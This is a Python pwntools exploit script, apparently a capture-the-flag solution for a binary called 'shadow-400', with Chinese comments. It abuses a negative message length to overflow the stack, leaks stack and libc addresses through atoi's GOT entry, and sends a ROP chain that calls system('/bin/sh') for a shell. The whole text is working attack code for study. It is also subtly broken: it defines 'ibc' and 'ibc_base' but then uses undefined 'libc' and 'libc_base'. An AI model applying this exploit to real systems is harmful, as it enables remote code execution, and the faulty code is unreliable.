#coding:utf8
from pwn import *
from LibcSearcher import *
 
#sh = process('./shadow-400')
sh = process("./shadow_b")
elf = ELF('./shadow-400')
atoi_got = elf.got['atoi']
 
def setName(name):
   sh.sendafter('Input name :',name)
 
def setMessage(message):
   #-1转换为无符号数，就很大，造成read溢出栈
   sh.sendlineafter('Message length :','-1')
   sh.sendafter('Input message :',message)
 
def changeName(c):
   sh.sendlineafter('Change name?',c)
 
#泄露栈地址，然后，我们可以计算出劫持read的返回地址存放在栈里的位置
setName('zhaohai'.ljust(0x10,'a'))
setMessage('hello,I am zhaohai')
sh.recvuntil('<')
sh.recv(0x1C)
stack_addr = u32(sh.recv(4))
changeName('n')
print 'stack_addr=',hex(stack_addr)
#我们需要利用setName修改这个地方，这里是libc中read返回地址存放处，这里布下ROP即可
target_addr = stack_addr - 0x100
#覆盖指针,覆盖getline的长度,覆盖循环最大次数，用于泄露函数地址及多次利用
payload = 'a'*0x34 + p32(atoi_got) + p32(0x100) + p32(0x100)
setMessage(payload)
sh.recvuntil('<')
atoi_addr = u32(sh.recv(4))
print 'atoi_addr=',hex(atoi_addr)
ibc = LibcSearcher('atoi',atoi_addr)
ibc_base = atoi_addr - libc.dump('atoi')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
changeName('n')
#覆盖指针，然后我们利用setName写数据到目标处
payload = 'a'*0x34 + p32(target_addr)
setMessage(payload)
#现在，可以发送ROP了
rop = p32(system_addr) + p32(0) + p32(binsh_addr)
setName(rop)
 
 
sh.interactive()

FFCE7B2C

FFCE7B7C